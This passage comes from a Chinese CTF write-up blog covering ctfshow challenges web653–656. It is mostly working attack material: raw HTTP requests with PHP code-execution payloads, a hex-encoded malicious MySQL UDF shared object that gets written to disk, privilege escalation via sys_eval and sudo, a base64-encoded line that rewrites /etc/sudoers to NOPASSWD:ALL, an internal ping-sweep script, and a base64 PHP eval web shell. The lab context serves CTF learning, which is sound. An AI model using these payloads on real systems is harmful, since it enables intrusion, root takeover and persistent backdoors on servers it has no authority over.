Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;&amp;a=ls</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">key=key_is_here_you_know&amp;file=..%2Fdb%2Fdata_you_never_know.db&amp;a=phpinfo%28%29%3B</span><br></pre></td></tr></table></figure>

<p>链接<code>antsword</code></p>
<p><img src="/../images/achieves/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ20240924-140925.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_653=ctfshow&#123;5526710eb3ed7b4742232d6d6f9ee3a9&#125;</span><br></pre></td></tr></table></figure>

<p>查看不了在之前的包里面RCE拿到的</p>
<h1 id="web654"><a href="#web654" class="headerlink" title="web654"></a>web654</h1><p>之前我们看到了SQL的密码所以连接一下，来提权(<del>从没接触过</del>之前只会suid啥的)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%secure%&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>secure_file_priv 为&#x2F;root&#x2F; </p>
<p>可以使用UDF提权,其本身就是上传一个恶意so文件来作为外部函数，然后我们就可以传入一个高权限的.so指令，再在mysql里面调用这个函数即可</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%plugin%&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mariadb<span class="operator">/</span>plugin<span class="operator">/</span></span><br></pre></td></tr></table></figure>

<p><code>plugin</code>路径也就是<code>so</code>文件上传路径这里我们去到<code>sqlmap</code>里面找到恶意<code>so</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap路径\data\udf\mysql\linux\64\lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;&amp;a=ls HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=372619038</span><br><span class="line">Content-Length: 15585</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Origin: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;&amp;a=ls</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">key=key_is_here_you_know&amp;file=..%2Fdb%2Fdata_you_never_know.db&amp;a=file_put_contents(&#x27;udf.so&#x27;,hex2bin(&#x27;7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000&#x27;));</span><br></pre></td></tr></table></figure>

<p>然后执行命令(在终端里面)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /var/www/html/system36d/util/udf.so /usr/lib/mariadb/plugin/udf.so</span><br></pre></td></tr></table></figure>

<p>再在sql里面执行命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 创建恶意函数</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.so&#x27;</span>;</span><br><span class="line"># 看看成功没</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;sys_eval&#x27;</span>;</span><br><span class="line"># 执行命令</span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;sudo ls /root&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;sudo cat /root/you_win&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">祝贺你，你已经完全控制了这台服务器，为你一路以来的坚持和努力，点赞！</span><br><span class="line"></span><br><span class="line">                  真不容易啊，师傅好样的！</span><br><span class="line"></span><br><span class="line">不过别高兴的太早，这只是第一关，后面还有更艰难的挑战，你准备好了吗！</span><br><span class="line"></span><br><span class="line">对了，这是给你的flag </span><br><span class="line"></span><br><span class="line">flag<span class="built_in">_</span>654=ctfshow&#123;4ab2c2ccd0c3c35fdba418d8502f5da9&#125; </span><br><span class="line"></span><br><span class="line">                                   ——大菜鸡 2021年8月2日02时12�</span><br></pre></td></tr></table></figure>

<h1 id="web655"><a href="#web655" class="headerlink" title="web655"></a>web655</h1><p>先给我们自己加权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data ALL=(ALL:ALL) NOPASSWD:ALL</span><br><span class="line"></span><br><span class="line">echo &#x27;d3d3LWRhdGEgQUxMPShBTEw6QUxMKSBOT1BBU1NXRDpBTEw=&#x27;|base64 -d &gt;/var/www/html/sudoers</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;sudo cp /var/www/html/sudoers /etc/sudoers&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo id</span><br></pre></td></tr></table></figure>

<p>欧克啊，内网看看了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:AC:02:29:04  </span><br><span class="line">          inet addr:172.2.41.4  Bcast:172.2.41.255  Mask:255.255.255.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1</span><br><span class="line">          RX packets:19306 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16357 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:6516844 (6.2 MiB)  TX bytes:22335780 (21.3 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:105898 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:105898 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:29018140 (27.6 MiB)  TX bytes:29018140 (27.6 MiB)</span><br></pre></td></tr></table></figure>

<p>发现IP,<code>172.2.41.4</code></p>
<p>写个<code>sh</code>来挨个<code>ping</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ip=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$ip</span> != <span class="string">&quot;254&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">    ping 172.2.41.<span class="variable">$ip</span> -c 2 | grep -q <span class="string">&quot;ttl=&quot;</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;172.2.41.<span class="variable">$ip</span> yes&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;172.2.41.<span class="variable">$ip</span> no&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    ip=`<span class="built_in">expr</span> <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> <span class="string">&quot;+&quot;</span> <span class="string">&quot;1&quot;</span>`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;IyEvYmluL2Jhc2gKaXA9MQp3aGlsZSBbICRpcCAhPSAiMjU0IiBdOyBkbwogICAgcGluZyAxNzIuMi40MS4kaXAgLWMgMiB8IGdyZXAgLXEgInR0bD0iICYmIGVjaG8gIjE3Mi4yLjQxLiRpcCB5ZXMiIHx8IGVjaG8gIjE3Mi4yLjQxLiRpcCBubyIgPi9kZXYvbnVsbCAyPiYxCiAgICBpcD1gZXhwciAiJGlwIiAiKyIgIjEiYApkb25l&#x27;|base64 -d &gt; 1.sh</span><br></pre></td></tr></table></figure>

<p>然后发现死活不能执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 755 1.sh</span><br><span class="line"></span><br><span class="line">./1.sh &gt; a.txt</span><br><span class="line"></span><br><span class="line">(www-data:/var/www/html) $ cat a.txt</span><br><span class="line">172.2.41.1 yes</span><br><span class="line">172.2.41.2 yes</span><br><span class="line">172.2.41.3 yes</span><br><span class="line">172.2.41.4 yes</span><br><span class="line">172.2.41.5 yes</span><br><span class="line">172.2.41.6 yes</span><br><span class="line">172.2.41.7 yes</span><br></pre></td></tr></table></figure>

<p>终于拿到了然后就酷酷测试吧</p>
<p>在原来的写入文件页面执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=echo `curl http://172.2.41.5/phpinfo.php`;</span><br><span class="line"></span><br><span class="line">flag_655=ctfshow&#123;aada21bce99ddeab20020ac714686303&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web656"><a href="#web656" class="headerlink" title="web656"></a>web656</h1><p>同时发现这里还有源码，搞下来米西米西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==&#x27;|base64 -d &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p>我原先误以为重新写个马来连接，能行的，结果还是不行，那么只能在机器上面搞了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 644 www.zip</span><br><span class="line"></span><br><span class="line">sudo unzip www.zip</span><br></pre></td></tr></table></figure>

<p>还是不行，最后我突然想到说，我直接访问下载不就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>=<span class="string">&#x27;管理员请注意，下面是最近登陆失败用户：&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span>=db::<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ret</span> <span class="keyword">as</span> <span class="variable">$r</span>) &#123;</span><br><span class="line">    	<span class="variable">$html</span> .=<span class="string">&#x27;------------&lt;br&gt;用户名: &#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>[<span class="number">0</span>]).<span class="string">&#x27;&lt;br&gt;登陆失败时间: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">1</span>]</span><br><span class="line">    	.<span class="string">&#x27;&lt;br&gt;登陆失败IP: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">2</span>].</span><br><span class="line">    	<span class="string">&#x27;&lt;br&gt;------------&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

